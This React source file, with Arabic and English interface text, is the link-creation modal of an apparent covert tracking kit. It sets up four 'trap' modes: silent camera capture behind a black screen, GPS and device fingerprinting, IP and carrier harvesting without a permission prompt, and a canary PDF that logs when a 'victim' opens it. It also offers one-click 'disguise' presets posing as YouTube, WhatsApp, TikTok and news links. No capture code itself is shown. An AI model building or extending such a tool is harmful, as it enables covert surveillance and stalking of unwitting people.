import React, { useState, useEffect } from 'react';
import {
  X,
  Camera,
  Crosshair,
  Radio,
  FileText,
  Link,
  Link2,
  Sparkles,
  ShieldAlert,
  CheckCircle2,
  Zap,
  Globe,
  ArrowRight,
  ExternalLink,
  Cpu,
  Eye,
  Youtube,
  HardDrive,
  Instagram,
  Music,
  Facebook,
  MessageCircle,
  Newspaper
} from 'lucide-react';
import { Language } from '../translations';
import { TrackingMode } from '../types';

export interface SectionTrapConfig {
  mode: TrackingMode;
  titleAr: string;
  titleEn: string;
  descAr: string;
  descEn: string;
  badge: string;
  badgeColor: string;
  icon: React.ReactNode;
  specs: { ar: string; en: string }[];
  placeholderUrl: string;
}

export const TRAP_CONFIGS: Record<TrackingMode, SectionTrapConfig> = {
  camera: {
    mode: 'camera',
    titleAr: 'قسم نظام فخ الكاميرا',
    titleEn: 'Camera Trap Surveillance',
    descAr: 'نظام التقاط صامت يلتقط صوراً متسلسلة بالتناوب بين الكاميرا الأمامية والخلفية بمجرد الضغط، مع دعم تلقائي لكاميرا واحدة مثل اللابتوب بدون توقف وبشاشة سوداء.',
    descEn: 'Captures sequential photos alternating front and rear lenses (or auto-fallback to single lens) covertly via a black screen.',
    badge: 'CAMERA TRAP',
    badgeColor: 'bg-rose-100 text-rose-700 border-rose-300',
    icon: <Camera className="w-5 h-5 text-rose-600" />,
    specs: [
      { ar: 'صور متسلسلة (صورة كل ثانية)', en: 'Sequential shots (1 frame per second)' },
      { ar: 'تناوب ذكي بين العدسة الأمامية والخلفية', en: 'Smart toggling between front & rear lenses' },
      { ar: 'اكتشاف ذكي لكاميرا اللابتوب واستكمال الالتقاط', en: 'Auto fallback for laptops (single lens continuity)' },
      { ar: 'معرض فوري مع أزرار تنزيل فردية وزر تحميل الكل', en: 'Instant live gallery with download buttons' },
    ],
    placeholderUrl: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
  },
  precise: {
    mode: 'precise',
    titleAr: 'قسم تحديد إحداثيات (GPS والمستشعرات)',
    titleEn: 'High-Accuracy Satellite GPS Tracker',
    descAr: 'تتبع جغرافي فائق الدقة يصل لمستوى الأمتار مع رسم فوري على خرائط جوجل وقمر صناعي، واستخراج بيانات البطارية وبصمة المعالج GPU.',
    descEn: 'Pinpoint satellite GPS telemetry with 3-meter accuracy, Google Satellite Maps visualization, battery level, and GPU WebGL fingerprinting.',
    badge: 'GPS SATELLITE',
    badgeColor: 'bg-indigo-100 text-indigo-700 border-indigo-300',
    icon: <Crosshair className="w-5 h-5 text-indigo-600" />,
    specs: [
      { ar: 'إحداثيات قمر صناعي دقيقة بالأمتار والارتفاع والسرعة', en: 'Satellite coords within 3 meters, altitude & speed' },
      { ar: 'رسم مباشر على خرائط Google Maps وقمر صناعي', en: 'Instant Google Satellite and Street Map pin' },
      { ar: 'بصمة الشاشة وكرت الشاشة WebGL والبطارية', en: 'Battery level, WebGL GPU, & screen depth' },
      { ar: 'تحويل تلقائي سلس للرابط الأصلي', en: 'Seamless auto-redirection to original target' },
    ],
    placeholderUrl: 'https://maps.google.com',
  },
  near: {
    mode: 'near',
    titleAr: 'قسم تلغيم التتبع الصامت للشبكة وIP ومزود الخط',
    titleEn: 'Silent Near IP Network Intelligence',
    descAr: 'تتبع فوري وصامت تماماً بدون أي نوافذ إذن. يرصد عنوان الـ IP الحقيقي، الدولة، المدينة، شركة الاتصالات (ISP)، ونوع الخط (Wi-Fi أو 4G/5G).',
    descEn: '100% silent zero-prompt intelligence capturing true IP, country, city, ISP telecom carrier, ASN, and connection medium.',
    badge: 'ZERO PERMISSIONS',
    badgeColor: 'bg-emerald-100 text-emerald-700 border-emerald-300',
    icon: <Radio className="w-5 h-5 text-emerald-600" />,
    specs: [
      { ar: 'تتبع صامت 100% بدون أي طلب إذن من الضحية', en: 'Zero-permission instant stealth recording' },
      { ar: 'كشف عنوان IP الحقيقي والدولة والمدينة ومزود الخط', en: 'Resolve IP, Country, City, & ISP telecom carrier' },
      { ar: 'تمييز نوع الاتصال (واي فاي Wi-Fi أو بيانات شريحة 4G/5G)', en: 'Detect Wi-Fi vs Cellular Mobile Data line' },
      { ar: 'تحويل سريع للرابط المستهدف خلال 3 ثوانٍ', en: 'Smooth auto-redirect within 3 seconds' },
    ],
    placeholderUrl: 'https://www.google.com',
  },
  pdf: {
    mode: 'pdf',
    titleAr: 'قسم تلغيم وثائق ومستندات الـ PDF (Canary Token)',
    titleEn: 'Smart Canary PDF Document Tracker',
    descAr: 'إنشاء ملف وثيقة PDF ذكية ملغمة برمز تتبع خفي. بمجرد فتح المستند على هاتف أو كمبيوتر الضحية يتم توثيق موقع الـ IP والبيانات فوراً.',
    descEn: 'Generates an intelligence-grade PDF document with embedded canary token logging remote opening, IP, and reader software.',
    badge: 'CANARY PDF',
    badgeColor: 'bg-amber-100 text-amber-700 border-amber-300',
    icon: <FileText className="w-5 h-5 text-amber-600" />,
    specs: [
      { ar: 'توليد ملف PDF رسمي جاهز للتحميل والتوزيع', en: 'Generate stealth PDF document ready for distribution' },
      { ar: 'رصد لحظي لمجرد فتح المستند عن بعد', en: 'Real-time alert when document is opened anywhere' },
      { ar: 'توثيق عنوان الـ IP والبرنامج القارئ للمستند', en: 'Captures reader software client & IP geolocation' },
      { ar: 'مراقبة حية وجدول تفصيلي للمشاهدات', en: 'Live audit log of all remote document accesses' },
    ],
    placeholderUrl: 'https://drive.google.com',
  },
};

interface SectionTrapModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialMode?: TrackingMode;
  lang: Language;
  onCreateLink: (targetUrl: string, mode: TrackingMode) => Promise<void>;
  isCreating: boolean;
}

export const SectionTrapModal: React.FC<SectionTrapModalProps> = ({
  isOpen,
  onClose,
  initialMode = 'camera',
  lang,
  onCreateLink,
  isCreating,
}) => {
  const [selectedMode, setSelectedMode] = useState<TrackingMode>(initialMode);
  const [targetUrl, setTargetUrl] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  useEffect(() => {
    if (initialMode) {
      setSelectedMode(initialMode);
    }
    setErrorMsg('');
  }, [initialMode, isOpen]);

  if (!isOpen) return null;

  const currentConfig = TRAP_CONFIGS[selectedMode] || TRAP_CONFIGS.camera;

  const quickPresets = [
    { label: lang === 'ar' ? 'يوتيوب فيديو' : 'YouTube Video', url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ', icon: <Youtube className="w-3.5 h-3.5" /> },
    { label: lang === 'ar' ? 'جوجل درايف' : 'Google Drive', url: 'https://drive.google.com/drive/folders/shared-files', icon: <HardDrive className="w-3.5 h-3.5" /> },
    { label: lang === 'ar' ? 'إنستغرام' : 'Instagram Reel', url: 'https://www.instagram.com/reel/trending-clip', icon: <Instagram className="w-3.5 h-3.5" /> },
    { label: lang === 'ar' ? 'تيك توك' : 'TikTok Video', url: 'https://www.tiktok.com/@creator/video/viral-clip', icon: <Music className="w-3.5 h-3.5" /> },
    { label: lang === 'ar' ? 'فيسبوك بوست' : 'Facebook Post', url: 'https://www.facebook.com/share/p/trending-post', icon: <Facebook className="w-3.5 h-3.5" /> },
    { label: lang === 'ar' ? 'واتساب انضمام' : 'WhatsApp Group', url: 'https://chat.whatsapp.com/invite/group-link', icon: <MessageCircle className="w-3.5 h-3.5" /> },
    { label: lang === 'ar' ? 'خبر عاجل' : 'Breaking News', url: 'https://www.aljazeera.net/news', icon: <Newspaper className="w-3.5 h-3.5" /> },
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    let url = targetUrl.trim();
    if (!url) {
      url = currentConfig.placeholderUrl;
    }

    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }

    try {
      new URL(url);
    } catch {
      setErrorMsg(lang === 'ar' ? 'الرجاء كتابة رابط موقع صحيح (مثال: https://youtube.com)' : 'Please enter a valid target URL (e.g. https://youtube.com)');
      return;
    }

    setErrorMsg('');
    await onCreateLink(url, selectedMode);
    onClose();
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-slate-950/70 backdrop-blur-xs animate-in fade-in duration-200">
      <div className="bg-white rounded-2xl sm:rounded-3xl border border-slate-200 shadow-2xl p-4 sm:p-6 max-w-lg w-full flex flex-col gap-4 max-h-[90vh] overflow-y-auto relative scrollbar-thin">
        
        {/* Header with Icon & Close Button */}
        <div className="flex items-center justify-between pb-3 border-b border-slate-100">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-2xl bg-indigo-50 border border-indigo-200 flex items-center justify-center shadow-2xs shrink-0">
              {currentConfig.icon}
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-sm sm:text-base font-black text-slate-950 tracking-tight">
                  {lang === 'ar' ? currentConfig.titleAr : currentConfig.titleEn}
                </h3>
              </div>
              <span className={`inline-block px-2 py-0.5 rounded-md text-[10px] font-black mt-0.5 border ${currentConfig.badgeColor}`}>
                {currentConfig.badge}
              </span>
            </div>
          </div>

          <button
            type="button"
            onClick={onClose}
            className="p-2 rounded-xl text-slate-400 hover:text-slate-950 hover:bg-slate-100 transition-colors cursor-pointer"
            title={lang === 'ar' ? 'إغلاق' : 'Close'}
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Mode Selector Tabs (Allows quick switching between tracking types right here) */}
        <div className="flex flex-col gap-1.5">
          <label className="text-xs font-bold text-slate-700">
            {lang === 'ar' ? 'اختر نظام التلغيم المطلوب:' : 'Select Tracking Mode:'}
          </label>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-1.5 p-1 bg-slate-100 rounded-xl border border-slate-200">
            {(Object.keys(TRAP_CONFIGS) as TrackingMode[]).map((modeKey) => {
              const cfg = TRAP_CONFIGS[modeKey];
              const isSelected = selectedMode === modeKey;
              return (
                <button
                  key={modeKey}
                  type="button"
                  onClick={() => setSelectedMode(modeKey)}
                  className={`flex flex-col items-center justify-center p-2 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                    isSelected
                      ? 'bg-white text-indigo-900 shadow-2xs border border-indigo-200'
                      : 'text-slate-600 hover:text-slate-950 hover:bg-white/50'
                  }`}
                >
                  <div className="mb-1">{cfg.icon}</div>
                  <span className="text-[11px] truncate w-full text-center">
                    {modeKey === 'camera'
                      ? (lang === 'ar' ? 'الكاميرا (30)' : 'Camera (30)')
                      : modeKey === 'precise'
                      ? (lang === 'ar' ? 'موقع GPS' : 'GPS Satellite')
                      : modeKey === 'near'
                      ? (lang === 'ar' ? 'تتبع صامت' : 'Silent IP')
                      : (lang === 'ar' ? 'ملف PDF' : 'PDF Canary')}
                  </span>
                </button>
              );
            })}
          </div>
        </div>

        {/* Section Description & Telemetry Specifications */}
        <div className="bg-slate-50 rounded-xl p-3 border border-slate-200 flex flex-col gap-2">
          <p className="text-xs text-slate-600 font-medium leading-relaxed">
            {lang === 'ar' ? currentConfig.descAr : currentConfig.descEn}
          </p>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-1.5 pt-2 border-t border-slate-200/80">
            {currentConfig.specs.map((sp, idx) => (
              <div key={idx} className="flex items-center gap-1.5 text-[11px] text-slate-700 font-medium">
                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
                <span>{lang === 'ar' ? sp.ar : sp.en}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Input Form for Target Link */}
        <form onSubmit={handleSubmit} className="flex flex-col gap-3">
          
          <div className="bg-indigo-50 border border-indigo-200 rounded-lg p-2.5 flex items-start gap-2">
            <Sparkles className="w-4 h-4 text-indigo-600 shrink-0 mt-0.5" />
            <p className="text-[11px] font-medium text-indigo-900 leading-relaxed">
              {lang === 'ar' 
                ? 'يرجى كتابة أو لصق رابط الوجهة الحقيقي (مثل فيديو، مقال، أو موقع) ثم الضغط على "تلغيم" لإنشاء رابط التتبع مع إعادة التوجيه التلقائي للضحية.' 
                : 'Write or paste the real destination URL (e.g. video, article, or site) then click "Trap" to create your tracking link with automatic redirection.'}
            </p>
          </div>

          <div className="flex flex-col gap-1.5">
            <label className="text-xs font-black text-slate-900 flex items-center justify-between">
              <span className="flex items-center gap-1.5">
                <Link className="w-3.5 h-3.5 text-indigo-600" />
                <span>{lang === 'ar' ? 'اكتب الرابط المراد تلغيمه وتوجيه الضحية إليه:' : 'Enter Target URL to Trap & Redirect:'}</span>
              </span>
              <span className="text-[10px] text-slate-400 font-normal">
                {lang === 'ar' ? '(يوتيوب، درايف، إنستغرام، خبر، إلخ)' : '(YouTube, Drive, Social, News)'}
              </span>
            </label>

            <div className="relative flex items-center">
              <input
                type="text"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder={currentConfig.placeholderUrl}
                className="w-full px-3.5 py-2.5 rounded-xl border-2 border-indigo-200 focus:border-indigo-600 focus:ring-2 focus:ring-indigo-100 bg-white text-xs sm:text-sm text-slate-900 placeholder:text-slate-400 outline-none transition-all shadow-2xs font-mono"
                autoFocus
                disabled={isCreating}
              />
              {targetUrl && (
                <button
                  type="button"
                  onClick={() => setTargetUrl('')}
                  className="absolute end-2.5 p-1 rounded-md text-slate-400 hover:text-slate-700 cursor-pointer"
                >
                  <X className="w-4 h-4" />
                </button>
              )}
            </div>

            {errorMsg && (
              <span className="text-xs text-rose-600 font-bold flex items-center gap-1 mt-0.5">
                <ShieldAlert className="w-3.5 h-3.5" />
                {errorMsg}
              </span>
            )}
          </div>

          {/* Quick Presets / Templates */}
          <div className="flex flex-col gap-1">
            <span className="text-[11px] font-bold text-slate-500">
              {lang === 'ar' ? 'أو اختر قالب تمويه سريع جاهز بنقرة واحدة:' : 'Or pick a 1-click quick disguise preset:'}
            </span>
            <div className="flex flex-wrap gap-1.5">
              {quickPresets.map((preset, idx) => (
                <button
                  key={idx}
                  type="button"
                  onClick={() => setTargetUrl(preset.url)}
                  className="px-2.5 py-1.5 flex items-center gap-1.5 rounded-lg text-[11px] font-medium bg-slate-100 hover:bg-indigo-50 hover:text-indigo-700 hover:border-indigo-300 border border-slate-200 text-slate-700 transition-colors cursor-pointer"
                >
                  {preset.icon}
                  {preset.label}
                </button>
              ))}
            </div>
          </div>

          {/* Submit Action Button: Trap & Enter Dashboard Immediately */}
          <button
            type="submit"
            disabled={isCreating}
            className="w-full py-3 px-4 rounded-xl bg-indigo-600 hover:bg-indigo-700 active:bg-indigo-800 text-white font-black text-xs sm:text-sm shadow-md hover:shadow-lg transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-70 disabled:cursor-not-allowed mt-1"
          >
            {isCreating ? (
              <>
                <div className="w-4 h-4 rounded-full border-2 border-white/30 border-t-white animate-spin" />
                <span>{lang === 'ar' ? 'جاري تلغيم الرابط وتجهيز صفحة القسم...' : 'Generating Disguised Link & Opening Section...'}</span>
              </>
            ) : (
              <>
                <Zap className="w-4 h-4 text-amber-300 animate-pulse" />
                <span>{lang === 'ar' ? 'تلغيم الرابط والدخول لصفحة القسم فوراً' : 'Trap Link & Enter Live Section'}</span>
                <ArrowRight className="w-4 h-4 rtl:rotate-180" />
              </>
            )}
          </button>
        </form>

      </div>
    </div>
  );
};
